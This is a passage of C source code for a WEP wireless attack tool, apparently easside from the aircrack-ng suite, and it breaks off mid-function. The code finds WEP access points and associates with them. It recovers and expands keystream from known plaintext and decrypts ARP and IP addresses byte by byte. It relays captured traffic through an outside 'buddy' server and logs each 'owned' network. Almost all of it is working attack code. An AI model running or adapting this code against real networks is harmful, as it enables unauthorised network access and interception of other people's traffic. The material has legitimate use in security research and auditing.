 /*
  *  Copyright (c) 2007-2009 Andrea Bittau <a.bittau@cs.ucl.ac.uk>
  *
  *  This program is free software; you can redistribute it and/or modify
  *  it under the terms of the GNU General Public License as published by
  *  the Free Software Foundation; either version 2 of the License, or
  *  (at your option) any later version.
  *
  *  This program is distributed in the hope that it will be useful,
  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  *  GNU General Public License for more details.
  *
  *  You should have received a copy of the GNU General Public License
  *  along with this program; if not, write to the Free Software
  *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <sys/uio.h>
#include <sys/time.h>
#include <time.h>
#include <zlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <stdarg.h>
#define __FAVOR_BSD
#include <netinet/udp.h>
#undef __FAVOR_BSD

#include "osdep/osdep.h"
#include "ieee80211.h"
#include "easside.h"
#include "if_arp.h"
#include "ethernet.h"
#include "version.h"
#include "osdep/byteorder.h"


#define S_MTU		1500
#define S_MCAST		"\x01\x00\x5e\x01\x00"
#define S_LLC_SNAP	"\xAA\xAA\x03\x00\x00\x00"
#define S_LLC_SNAP_ARP	(S_LLC_SNAP "\x08\x06")
#define S_LLC_SNAP_IP	(S_LLC_SNAP "\x08\x00")
#define S_PRGA_LOG	"prga.log"
#define S_OWN_LOG	"own.log"
#define S_MIN_RTO	10

extern char * getVersion(char * progname, int maj, int min, int submin, int svnrev, int beta, int rc);

enum {
	S_SEARCHING = 0,
	S_SENDAUTH,
	S_SENDASSOC,
	S_ASSOCIATED
};

enum {
	AS_NOPRGA = 0,
	AS_PRGA_EXPAND,
	AS_FIND_IP,
	AS_DECRYPT_ARP,
	AS_DECRYPT_IP,
	AS_FIND_RTR_MAC,
	AS_CHECK_INET,
	AS_REDIRECT
};

struct rpacket {
	unsigned char	rp_packet[2048];
	int		rp_len;
	int		rp_id;
	struct rpacket	*rp_next;
};

struct owned {
	unsigned char	ow_mac[6];
	struct owned	*ow_next;
};

struct east_state {
	/* conf & params */
	char		es_ifname[256];
	unsigned char	es_mymac[6];
	int		es_setmac;
	int		es_iponly;
	struct wif	*es_wi;
	char		es_tapname[16];
	struct tif	*es_ti;
	unsigned int	es_hopfreq;
	int		es_txto_mgt;
	int		es_txto_expand;
	int		es_expand_factor;
	int		es_txto_decrypt;
	int		es_port;
	int		es_udp_port;
	int		es_txto_whohas;
	int		es_txto_checkinet;
	int		es_txto_redirect;
	unsigned char	es_clear[S_MTU+4];
	struct rpacket	*es_rqueue;
	struct owned	*es_owned;
	int		es_chanlock;

	/* state */
	unsigned char	es_apmac[6];
	int		es_apchan;
	char		es_apssid[256];
	int		es_state;
	struct timeval	es_lasthop;
	int		es_txseq;
	struct timeval	es_txlast;
	unsigned char	es_prga[S_MTU+4];
	unsigned char	*es_clearp;
	unsigned char	*es_clearpnext;
	int		es_prgalen;
	unsigned char	es_iv[3];
	int		es_expand_num;
	int		es_expand_len;
	int		es_txack;
	unsigned char	es_prga_d[S_MTU+4];
	int		es_prga_dlen;
	unsigned char	es_prga_div[3];
	unsigned char	es_packet[2048];
	int		es_have_packet;
	int		es_have_src;
	unsigned char	es_packet_arp[2048];
	int		es_have_arp;
	struct in_addr	es_myip;
	struct in_addr	es_rtrip;
	struct in_addr	es_pubip;
	unsigned char	es_rtrmac[6];
	struct in_addr	es_srvip;
	int		es_buddys;
	unsigned short	es_rpacket_id;
	struct timeval	es_rtt;
	unsigned short	es_rtt_id;
	int		es_srtt;
	int		es_rxseq;
	int		es_astate;
};

static struct east_state _es;

void printf_time(char *fmt, ...)
{
	va_list ap;
	struct timeval now;
	time_t t;
	struct tm *tm;

	if (gettimeofday(&now, NULL) == -1)
		err(1, "gettimeofday()");
	t = time(NULL);
	if (t == (time_t)-1)
		err(1, "time()");
	tm = localtime(&t);
	if (!tm)
		err(1, "localtime()");

	printf("[%.2d:%.2d:%.2d.%.6lu] ",
	       tm->tm_hour, tm->tm_min, tm->tm_sec, (long unsigned int)now.tv_usec);

	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
}

void hexdump(void *x, int len)
{
	unsigned char *p = x;

	while (len--)
		printf("%.2X ", *p++);
	printf("\n");
}

void mac2str(char *str, unsigned char* m, int macsize)
{
        snprintf(str, macsize, "%.2X:%.2X:%.2X:%.2X:%.2X:%.2X",
                m[0], m[1], m[2], m[3], m[4], m[5]);
}

int str2mac(unsigned char *mac, char *str)
{
        unsigned int macf[6];
        int i;

        if (sscanf(str, "%x:%x:%x:%x:%x:%x",
                   &macf[0], &macf[1], &macf[2],
                   &macf[3], &macf[4], &macf[5]) != 6)
                return -1;

        for (i = 0; i < 6; i++)
                *mac++ = (char) macf[i];

        return 0;
}

void init_defaults(struct east_state *es)
{
	memset(es, 0, sizeof(*es));

	memcpy(es->es_mymac, "\x00\x00\xde\xfa\xce\x0d", 6);
	es->es_setmac = 0;
	strncpy(es->es_ifname, "specify_interface", sizeof(es->es_ifname)-1);

	es->es_state = S_SEARCHING;
	es->es_hopfreq = 100; /* ms */

	es->es_txto_mgt = 100; /* ms */
	es->es_txto_expand = 100;
	es->es_expand_factor = 3;
	memcpy(es->es_clear, "\xAA\xAA\x03\x00\x00\x00\x08\x06", 8);
	es->es_clearpnext = es->es_clearp = es->es_clear;

	es->es_txto_decrypt = 10;

	es->es_txto_whohas = 500;
	es->es_txto_checkinet = 2000;
	es->es_txto_redirect = 2000;
	es->es_port = S_DEFAULT_PORT;
	es->es_udp_port = S_DEFAULT_UDP_PORT;
}

void reset(struct east_state *es)
{
	int sz;
	void *ptr;
	struct rpacket *p;
	struct owned *ow;
	FILE *f;
	char mac[18];

	/* close buddy */
	close(es->es_buddys);
	es->es_buddys = 0;

	/* reset state */
	ptr = es->es_apmac;
	sz = sizeof(*es) - ((unsigned long)ptr - (unsigned long)es);
	memset(ptr, 0, sz);

	/* fixup state */
	es->es_clearpnext = es->es_clearp = es->es_clear;
	p = es->es_rqueue;
	while (p) {
		p->rp_len = 0;
		p = p->rp_next;
	}

	/* log ownage */
	ow = malloc(sizeof(*ow));
	if (!ow)
		err(1, "malloc()");
	memset(ow, 0, sizeof(*ow));
	memcpy(ow->ow_mac, es->es_apmac, sizeof(ow->ow_mac));
	ow->ow_next = es->es_owned;
	es->es_owned = ow;

	f = fopen(S_OWN_LOG, "a");
	if (!f)
		err(1, "fopen()");
	mac2str(mac, es->es_apmac, sizeof(mac));
	fprintf(f, "%s %d %s %s\n", mac, es->es_apchan, es->es_apssid,
		inet_ntoa(es->es_pubip));
	fclose(f);

	/* start over */
	es->es_state = S_SEARCHING;
	printf_time("Restarting");
}

/********** RIPPED
************/
unsigned short in_cksum (unsigned short *ptr, int nbytes) {
  register long sum;
  u_short oddbyte;
  register u_short answer;

  sum = 0;
  while (nbytes > 1)
    {
      sum += *ptr++;
      nbytes -= 2;
    }

  if (nbytes == 1)
    {
      oddbyte = 0;
      *((u_char *) & oddbyte) = *(u_char *) ptr;
      sum += oddbyte;
    }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}
/**************
************/

void open_wifi(struct east_state *es)
{
	struct wif *wi;

	wi = wi_open(es->es_ifname);
	if (!wi)
		err(1, "wi_open()");

	assert(es->es_wi == NULL);
	es->es_wi = wi;
}

void open_tap(struct east_state *es) {
	struct tif *ti;
	char *iface = NULL;

	if (es->es_tapname[0])
		iface = es->es_tapname;

	ti = ti_open(iface);
	if (!ti)
		err(1, "ti_open()");

        strncpy(es->es_tapname, ti_name(ti), sizeof(es->es_tapname) - 1);
	es->es_tapname[sizeof(es->es_tapname) - 1] = 0;

	printf("Setting tap MTU\n");
	if (ti_set_mtu(ti, S_MTU - 50) == -1)
		err(1, "ti_set_mtu()");

	es->es_ti = ti;
}

void set_mac(struct east_state *es)
{
	printf("Sorting out wifi MAC\n");
	if (!es->es_setmac) {
		char mac[18];

		if (wi_get_mac(es->es_wi, es->es_mymac) == -1)
			err(1, "wi_get_mac()");
		mac2str(mac, es->es_mymac, sizeof(mac));
		printf("MAC is %s\n", mac);

	} else if (wi_set_mac(es->es_wi, es->es_mymac) == -1)
		err(1, "wi_set_mac()");

	printf("Setting tap MAC\n");
	if (ti_set_mac(es->es_ti, es->es_mymac) == -1)
		err(1, "ti_set_mac()");
}

void set_tap_ip(struct east_state *es)
{
	if (ti_set_ip(es->es_ti, &es->es_myip) == -1)
		err(1, "ti_set_ip()");
}

void die(char *m)
{
	struct east_state *es = &_es;

	printf("Dying: %s\n", m);
	if (es->es_wi)
		wi_close(es->es_wi);
	if (es->es_ti)
		ti_close(es->es_ti);

	exit(0);
}

void sighand(int sig)
{
	if (sig) {} /* XXX unused */
	die("signal");
}

void set_chan(struct east_state *es)
{
	int chan = es->es_chanlock ? es->es_chanlock : es->es_apchan;

	if (wi_set_channel(es->es_wi, chan) == -1)
		err(1, "wi_set_channel");
}

void clear_timeout(struct east_state *es)
{
	memset(&es->es_txlast, 0, sizeof(es->es_txlast));
}

void read_beacon(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	ieee80211_mgt_beacon_t b = (ieee80211_mgt_beacon_t) (wh+1);
	u_int16_t capa;
	int bhlen = 12;
	int got_ssid = 0, got_channel = 0;
	struct owned *own = es->es_owned;

	len -= sizeof(*wh) + bhlen;
	if (len < 0) {
		printf("Short beacon %d\n", len);
		return;
	}

	if (es->es_state != S_SEARCHING)
		return;

	/* only wep */
	capa = IEEE80211_BEACON_CAPABILITY(b);
	if (!((capa & IEEE80211_CAPINFO_PRIVACY) &&
	    (capa & IEEE80211_CAPINFO_ESS)))
		return;

	/* lookin for a specific dude */
	if (memcmp(es->es_apmac, "\x00\x00\x00\x00\x00\x00", 6) != 0) {
		if (memcmp(es->es_apmac, wh->i_addr3, 6) != 0)
			return;
	}

	/* check if we already owned him */
	while (own) {
		if (memcmp(wh->i_addr3, own->ow_mac, 6) == 0)
			return;

		own = own->ow_next;
	}

	/* SSID and channel */
	b += bhlen;
	while (len > 1) {
		unsigned char ie_len = b[1];

		len -= 2 + ie_len;
		if (len < 0) {
			printf("Short IE %d %d\n", len, ie_len);
			return;
		}

		switch (b[0]) {
		case IEEE80211_ELEMID_SSID:
			if (!got_ssid) {
				strncpy(es->es_apssid, (char*) &b[2], ie_len);
				es->es_apssid[ie_len] = 0;
				if (strlen(es->es_apssid))
					got_ssid = 1;
			}
			break;

		case IEEE80211_ELEMID_DSPARMS:
			if (!got_channel)
				got_channel = b[2];
			break;
		}

		if (got_ssid && got_channel) {
			char str[18];

			memcpy(es->es_apmac, wh->i_addr3, sizeof(es->es_apmac));
			es->es_apchan = got_channel;
			es->es_state = S_SENDAUTH;
			mac2str(str, es->es_apmac, sizeof(str));
			printf("\nSSID %s Chan %d Mac %s\n",
			       es->es_apssid, es->es_apchan, str);

			if (!es->es_chanlock)
				set_chan(es);
			return;
		}

		b += 2 + ie_len;
	}
}

int for_me_and_from_ap(struct east_state *es, struct ieee80211_frame *wh)
{
	if (memcmp(wh->i_addr1, es->es_mymac, 6) != 0)
		return 0;

	if (memcmp(wh->i_addr2, es->es_apmac, 6) != 0)
		return 0;

	return 1;
}

void read_auth(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	unsigned short *sp = (unsigned short*) (wh+1);

	if (len) {} /* XXX unused */

	if (es->es_state != S_SENDAUTH)
		return;

	if (!for_me_and_from_ap(es, wh))
		return;

	if (le16toh(*sp) != 0) {
		printf("weird auth algo: %d\n", le16toh(*sp));
		return;
	}

	sp++;
	if (le16toh(*sp) != 2) {
		printf("weird auth transno: %d\n", le16toh(*sp));
		return;
	}

	sp++;
	if (le16toh(*sp) != 0) {
		printf("Auth unsuccessful %d\n", le16toh(*sp));
		exit(1);
	}

	printf("Authenticated\n");
	es->es_state = S_SENDASSOC;
}

int is_dup(struct east_state *es, struct ieee80211_frame *wh)
{
	unsigned short *sn = (unsigned short*) &wh->i_seq[0];
	unsigned short s;

	s = (le16toh(*sn) & IEEE80211_SEQ_SEQ_MASK) >> IEEE80211_SEQ_SEQ_SHIFT;

	if (s == es->es_rxseq)
		return 1;

	es->es_rxseq = s;
	return 0;
}

void read_deauth(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	unsigned short *sp = (unsigned short*) (wh+1);

	if (len) {} /* XXX unused */

	if (!for_me_and_from_ap(es, wh))
		return;

	if (is_dup(es, wh))
		return;

	printf("Deauth: %d\n", le16toh(*sp));
	es->es_state = S_SENDAUTH;
}

void read_disassoc(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	unsigned short *sp = (unsigned short*) (wh+1);

	if (len) {} /* XXX unused */

	if (!for_me_and_from_ap(es, wh))
		return;

	if (is_dup(es, wh))
		return;

	printf("Disassoc: %d\n", le16toh(*sp));
	es->es_state = S_SENDASSOC;
}

void read_assoc_resp(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	unsigned short *sp = (unsigned short*) (wh+1);

	if (len) {} /* XXX unused */

	if (es->es_state != S_SENDASSOC)
		return;

	if (!for_me_and_from_ap(es, wh))
		return;

	sp++; /* capa */

	/* sc */
	if (le16toh(*sp) != 0) {
		printf("Assoc unsuccessful %d\n", le16toh(*sp));
		exit(1);
	}

	sp++;
	printf("Associated: %d\n", IEEE80211_AID(le16toh(*sp)));
	es->es_state = S_ASSOCIATED;
	es->es_txack = 0;
	es->es_expand_num = -1;
}

void read_mgt(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	if (len < (int) sizeof(*wh)) {
		printf("Short mgt %d\n", len);
		return;
	}

	switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
	case IEEE80211_FC0_SUBTYPE_BEACON:
	case IEEE80211_FC0_SUBTYPE_PROBE_RESP:
		read_beacon(es, wh, len);
		break;

	case IEEE80211_FC0_SUBTYPE_AUTH:
		read_auth(es, wh, len);
		break;

	case IEEE80211_FC0_SUBTYPE_PROBE_REQ:
	case IEEE80211_FC0_SUBTYPE_ASSOC_REQ:
		break;

	case IEEE80211_FC0_SUBTYPE_DEAUTH:
		read_deauth(es, wh, len);
		break;

	case IEEE80211_FC0_SUBTYPE_DISASSOC:
		read_disassoc(es, wh, len);
		break;

	case IEEE80211_FC0_SUBTYPE_ASSOC_RESP:
		read_assoc_resp(es, wh, len);
		break;

	default:
		printf("Unknown mgmt subtype %x\n",
		       wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK);
		break;
	}
}

void read_ack(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	if (len) {} /* XXX unused */

	if (memcmp(wh->i_addr1, es->es_mymac, sizeof(wh->i_addr1)) != 0)
		return;

	es->es_txack = 1;
//	printf("Ack\n");
}

void read_ctl(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
	case IEEE80211_FC0_SUBTYPE_ACK:
		read_ack(es, wh, len);
		break;

	case IEEE80211_FC0_SUBTYPE_RTS:
	case IEEE80211_FC0_SUBTYPE_CTS:
	case IEEE80211_FC0_SUBTYPE_PS_POLL:
	case IEEE80211_FC0_SUBTYPE_CF_END:
		break;

	default:
		printf("Unknown ctl subtype %x\n",
		       wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK);
		break;
	}
}

int our_network(struct east_state *es, struct ieee80211_frame *wh)
{
	void *bssid = (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) ?
			wh->i_addr2 : wh->i_addr1;

	return memcmp(es->es_apmac, bssid, sizeof(es->es_apmac)) == 0;
}

void xor(void *out, void *clear, void *cipher, int len)
{
	unsigned char *cl = (unsigned char*) clear;
	unsigned char *ci = (unsigned char*) cipher;
	unsigned char *o = (unsigned char*) out;

	while (len--)
		*o++ = *cl++ ^ *ci++;
}

void save_prga(struct east_state *es)
{
	int fd, rc;

	assert(es->es_prgalen <= (int) sizeof(es->es_prga));
	printf_time("Got %d bytes of PRGA IV [%.2X:%.2X:%.2X]",
	       	    es->es_prgalen, es->es_iv[0], es->es_iv[1], es->es_iv[2]);

#if 0
	printf(": ");
	for (i = 0; i < es->es_prgalen; i++)
		printf("%.2X ", es->es_prga[i]);
#endif
	printf("\n");

	fd = open(S_PRGA_LOG, O_WRONLY | O_CREAT, 0644);
	if (fd == -1)
		err(1, "save_prga: open()");

	rc = write(fd, es->es_iv, 3);
	if (rc != 3) {
		printf("save_prga: can't write IV\n");
		exit(1);
	}
	rc = write(fd, es->es_prga, es->es_prgalen);
	if (rc != es->es_prgalen) {
		printf("save_prga: can't write PRGA\n");
		exit(1);
	}
	close(fd);
}

int is_arp(struct ieee80211_frame *wh, int len)
{
	int arpsize = 8 + sizeof(struct arphdr) + 10*2;

	if (wh) {} /* XXX unused */

	if (len == arpsize || len == 54)
		return 1;

	return 0;
}

void *get_sa(struct ieee80211_frame *wh)
{
	if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		return wh->i_addr3;
	else
		return wh->i_addr2;
}

void *get_da(struct ieee80211_frame *wh)
{
	if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		return wh->i_addr1;
	else
		return wh->i_addr3;
}

int known_clear(void *clear, struct ieee80211_frame *wh, int len)
{
	unsigned char *ptr = clear;

	/* IP */
	if (!is_arp(wh, len)) {
		unsigned short iplen = htons(len - 8);

		printf("Assuming IP %d\n", len);

		len = sizeof(S_LLC_SNAP_IP) - 1;
		memcpy(ptr, S_LLC_SNAP_IP, len);
		ptr += len;
#if 1
		len = 2;
		memcpy(ptr, "\x45\x00", len);
		ptr += len;

		memcpy(ptr, &iplen, len);
		ptr += len;
#endif
		len = ptr - ((unsigned char*)clear);
		return len;
	}
	printf("Assuming ARP %d\n", len);

	/* arp */
	len = sizeof(S_LLC_SNAP_ARP) - 1;
	memcpy(ptr, S_LLC_SNAP_ARP, len);
	ptr += len;

	/* arp hdr */
	len = 6;
	memcpy(ptr, "\x00\x01\x08\x00\x06\x04", len);
	ptr += len;

	/* type of arp */
	len = 2;
	if (memcmp(get_da(wh), "\xff\xff\xff\xff\xff\xff", 6) == 0)
		memcpy(ptr, "\x00\x01", len);
	else
		memcpy(ptr, "\x00\x02", len);
	ptr += len;

	/* src mac */
	len = 6;
	memcpy(ptr, get_sa(wh), len);
	ptr += len;

	len = ptr - ((unsigned char*)clear);
	return len;
}

void base_prga(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	unsigned char ct[1024];
	unsigned char *data = (unsigned char*) (wh+1);
	int prgalen;

	memcpy(es->es_iv, data, 3);
	data += 4;
	len -= 4 + 4; /* IV & CRC */
	if (len <= 0) {
		printf("base_prga: lame len %d\n", len);
		return;
	}

	prgalen = known_clear(ct, wh, len);

	xor(es->es_prga, ct, data, prgalen);
	es->es_prgalen = prgalen;

	save_prga(es);
}

unsigned int get_crc32(void *data, int len)
{
	uLong crc;

	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, data, len);
	return crc;
}

void check_expand(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	int elen;
	unsigned long crc;
	unsigned char *data = (unsigned char*) (wh+1);

	if (!(wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS))
		return;

	if (memcmp(es->es_apmac, wh->i_addr2, 6) != 0)
		return;

	if (memcmp(es->es_mymac, wh->i_addr3, 6) != 0)
		return;

	if (memcmp("\xff\xff\xff\xff\xff\xff", wh->i_addr1, 6) != 0)
		return;

	elen = es->es_expand_len;

	if (elen != (len-4))
		return;

	if (elen <= es->es_prgalen)
		return;

	/* iv */
	memcpy(es->es_iv, data, 3);
	data += 4;
	elen -= 4;

	/* payload */
	assert(elen <= (int) sizeof(es->es_clear));
	es->es_prgalen = elen + 4;
	xor(es->es_prga, es->es_clear, data, elen);

	/* crc */
	crc = htole32(get_crc32(es->es_clear, elen));
	xor(&es->es_prga[elen], &crc, data + elen, 4);

	save_prga(es);
	if (es->es_prgalen == sizeof(es->es_prga))
		es->es_astate = AS_FIND_IP;
}

int to_me(struct east_state *es, struct ieee80211_frame *wh)
{
	return (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
	       memcmp(es->es_mymac, get_da(wh), 6) == 0;
}

int from_me(struct east_state *es, struct ieee80211_frame *wh)
{
	return memcmp(es->es_mymac, get_sa(wh), 6) == 0;
}

int check_decrypt(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	int elen;

	if (!from_me(es, wh))
		return 0;

	if (memcmp(wh->i_addr1, S_MCAST, 5) != 0)
		return 0;

	elen = es->es_prga_dlen + 1;

	if (elen != (len - 4))
		return 0;

	es->es_prga_d[es->es_prga_dlen] = wh->i_addr1[5];
#if 0
	printf("\nPrga byte %d is %.2X\n",
	       es->es_prga_dlen, es->es_prga_d[es->es_prga_dlen]);
#endif
	es->es_prga_dlen++;

	assert(es->es_prga_dlen <= (int) sizeof(es->es_prga_d));
	return 1;
}

void decrypt_ip_addr(struct east_state *es, void *dst, int *len,
		     void *cipher, int off)
{
	unsigned char *c = cipher;

	*len = es->es_prga_dlen - off;
	if (*len > 4)
		*len = 4;
	assert(*len > 0);
	xor(dst, c + off, es->es_prga_d + off, *len);
}

void found_net_addr(struct east_state *es, unsigned char *a)
{
	unsigned char ip[4];

	memcpy(ip, a, 3);
	if (!ip[0]) {
		printf("Shit, prolly got a lame dhcp dude\n");
		exit(1);
	}

	ip[3] = 123;
	memcpy(&es->es_myip, ip, 4);
	printf("My IP %s\n", inet_ntoa(es->es_myip));
	set_tap_ip(es);

	ip[3] = 1;
	memcpy(&es->es_rtrip, ip, 4);
	printf("Rtr IP %s\n", inet_ntoa(es->es_rtrip));
	es->es_astate = AS_FIND_RTR_MAC;
}

void check_decrypt_arp(struct east_state *es, struct ieee80211_frame *wh,
		       int len)
{
	unsigned char ip[4];
	int iplen;
	int off = 8 + sizeof(struct arphdr) + 6;
	unsigned char *data;
	int i;

	if (!check_decrypt(es, wh, len))
		return;

	iplen = es->es_prga_dlen - off;
	assert(iplen > 0 && iplen <= (int) sizeof(ip));

	data = (unsigned char*)(((struct ieee80211_frame*)es->es_packet_arp)+1);
	data += + 4 + off;
	xor(ip, data, &es->es_prga_d[off], iplen);

	printf("\nARP IP so far: ");
	for (i = 0; i < iplen; i++) {
		printf("%d", ip[i]);
		if ((i+1) < iplen)
			printf(".");
	}
	printf("\n");

	if (iplen == 3)
		found_net_addr(es, ip);
}

void check_decrypt_ip(struct east_state *es, struct ieee80211_frame *wh,
		      int len)
{
	int off_ip = 8;
	int off_id = off_ip + 4;
	int off_ttl = off_id + 4;
	int off_p = off_ttl + 1;
	int off_check = off_p + 1;
	int off_s_addr = off_check + 2;
	int off_d_addr = off_s_addr + 4;
	unsigned char *data = es->es_packet + sizeof(*wh) + 4;

	if (!check_decrypt(es, wh, len))
		return;

	if (es->es_prga_dlen == (off_id+2)) {
#if 0
		unsigned char *c = data + off_id + 2;
#endif
		printf("\nGot IP ID\n");
#if 0
		xor(&es->es_prga_d[es->es_prga_dlen], c, "\x00\x00", 2);
		es->es_prga_dlen += 2;
		es->es_prga_d[es->es_prga_dlen] = 0;
#endif
	} else if (es->es_prga_dlen == (off_ttl+1)) {
		printf("\nGot IP TTL\n");
	} else if (es->es_prga_dlen == (off_p+1)) {
		unsigned char *c = data + off_p;
		int p = (*c) ^ es->es_prga_d[es->es_prga_dlen-1];
		char *str = NULL;

		switch (p) {
		case IPPROTO_ICMP:
			str = "icmp";
			break;
		case IPPROTO_UDP:
			str = "udp";
			break;
		case IPPROTO_TCP:
			str = "tcp";
			break;
		default:
			str = "unknown";
			break;
		}

		printf("\nGot proto %s\n", str);
	} else if (es->es_prga_dlen == (off_check+2)) {
		printf("\nGot checksum [could use to help bforce addr]\n");
	} else if ((es->es_prga_dlen >= off_s_addr) &&
		   (es->es_prga_dlen <= (off_s_addr+4))) {
		unsigned char ip[4];
		int iplen;
		int i;

		decrypt_ip_addr(es, ip, &iplen, data, off_s_addr);
		printf("\nSource IP so far: ");
		for (i = 0; i < iplen; i++) {
			printf("%d", ip[i]);
			if (i+1 < iplen)
				printf(".");
		}
		printf("\n");

		if (es->es_have_src && iplen == 3)
			found_net_addr(es, ip);
	} else if ((es->es_prga_dlen >= off_d_addr) &&
		   (es->es_prga_dlen <= (off_d_addr+4))) {
		unsigned char dip[4];
		struct in_addr sip;
		int iplen;
		int i;

		decrypt_ip_addr(es, &sip, &i, data, off_s_addr);
		decrypt_ip_addr(es, dip, &iplen, data, off_d_addr);
		printf("\nIPs so far %s->", inet_ntoa(sip));
		for (i = 0; i < iplen; i++) {
			printf("%d", dip[i]);
			if (i+1 < iplen)
				printf(".");
		}
		printf("\n");

		assert(!es->es_have_src);
		if (iplen == 3)
			found_net_addr(es, dip);
	} else if (es->es_prga_dlen > off_d_addr)
		abort();

}

void setup_internet(struct east_state *es)
{
	struct sockaddr_in s_in;
	char buf[16];

	es->es_astate = AS_CHECK_INET;
	clear_timeout(es);
	printf("Trying to connect to buddy: %s:%d\n",
	       inet_ntoa(es->es_srvip), es->es_port);

	assert(es->es_buddys == 0);
	es->es_buddys = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (es->es_buddys == -1)
		err(1, "setup_internet: socket()");

	memset(&s_in, 0, sizeof(s_in));
	s_in.sin_family = PF_INET;
	s_in.sin_addr = es->es_srvip;
	s_in.sin_port = htons(es->es_port);

	if (connect(es->es_buddys, (struct sockaddr*) &s_in, sizeof(s_in))
	    == -1)
		err(1, "setup_internet: connect()");
	printf("Connected\n");

	/* handshake */
	if (send(es->es_buddys, "sorbo", 5, 0) != 5)
		err(1, "setup_internet: send()");
	if (recv(es->es_buddys, buf, 6, 0) != 6)
		err(1, "setup_internet: recv()");

	if (memcmp(buf, "sorbox", 6) != 0) {
		printf("setup_internet: handshake failed");
		exit(1);
	}
	printf("Handshake compl33t\n");
}

void check_rtr_mac(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	void *sa;
	char str[18];

	if (!to_me(es, wh))
		return;

	if (!is_arp(wh, len-4-4))
		return;

	sa = get_sa(wh);
	memcpy(es->es_rtrmac, sa, 6);
	mac2str(str, es->es_rtrmac, sizeof(str));
	printf("Rtr MAC %s\n", str);

	setup_internet(es);
}

struct rpacket *get_slot(struct east_state *es)
{
	struct rpacket *slot = es->es_rqueue;
	struct rpacket *p = es->es_rqueue;

	/* try to recycle */
	while (slot) {
		if (!slot->rp_len)
			return slot;

		slot = slot->rp_next;
	}

	slot = malloc(sizeof(*slot));
	if (!slot)
		err(1, "get_slot: malloc()");
	memset(slot, 0, sizeof(*slot));

	if (!p)
		es->es_rqueue = slot;
	else {
		while (p->rp_next)
			p = p->rp_next;
		p->rp_next = slot;
	}
	return slot;
}

struct rpacket *get_head(struct east_state *es)
{
	struct rpacket *rp = es->es_rqueue;

	if (!rp)
		return NULL;

	if (!rp->rp_len)
		return NULL;

	return rp;
}

struct rpacket *get_packet(struct east_state *es, int id)
{
	struct rpacket *rp = es->es_rqueue;

	while (rp) {
		if (!rp->rp_len)
			return NULL;

		if (rp->rp_id == id)
			return rp;

		rp = rp->rp_next;
	}

	return NULL;
}

void remove_packet(struct east_state *es, int id)
{
	struct rpacket *rp = es->es_rqueue;
	struct rpacket **prevn;
	struct rpacket *p;

	assert(rp);
	prevn = &es->es_rqueue;

	/* find and remove */
	while (rp) {
		if (rp->rp_id == id) {
			rp->rp_len = 0;
			*prevn = rp->rp_next;
			break;
		}

		prevn = &rp->rp_next;
		rp = rp->rp_next;
	}
	assert(rp);

	/* only one element */
	p = es->es_rqueue;
	if (!p) {
		es->es_rqueue = rp;
		assert(!rp->rp_next);
		return;
	}

	while (p) {
		if (!p->rp_len) {
			rp->rp_next = p->rp_next;
			p->rp_next = rp;
			return;
		}

		prevn = &p->rp_next;
		p = p->rp_next;
	}

	/* last elem */
	rp->rp_next = NULL;
	*prevn = rp;
}

int queue_len(struct east_state *es)
{
	int len = 0;
	struct rpacket *slot = es->es_rqueue;

	while (slot) {
		if (!slot->rp_len)
			break;
		len++;
		slot = slot->rp_next;
	}

	return len;
}

void redirect_enque(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	char s[18];
	char d[18];
	struct rpacket *slot;

	slot = get_slot(es);

	slot->rp_len = len;
	assert(slot->rp_len <= (int) sizeof(slot->rp_packet));
	memcpy(slot->rp_packet, wh, slot->rp_len);
	es->es_rpacket_id++;
	slot->rp_id = es->es_rpacket_id;

	mac2str(s, get_sa(wh), sizeof(s));
	mac2str(d, get_da(wh), sizeof(d));
	printf_time("Enqueued packet id %d %s->%s %d [qlen %d]\n",
	       	    slot->rp_id, s, d, len - sizeof(*wh) - 4- 4, queue_len(es));
}

void check_redirect(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	if (!for_me_and_from_ap(es, wh))
		return;

	if (is_dup(es, wh))
		return;

	redirect_enque(es, wh, sizeof(*wh) + len);
}

void read_data(struct east_state *es, struct ieee80211_frame *wh, int len)
{
	if ((wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) !=
	     IEEE80211_FC0_SUBTYPE_DATA)
		return;

	if (!(wh->i_fc[1] & IEEE80211_FC1_WEP))
		return;

	if (!our_network(es, wh))
		return;

	if (!from_me(es, wh)) {
		if (!es->es_have_packet ||
		    (es->es_astate <= AS_FIND_IP && !es->es_have_src)) {
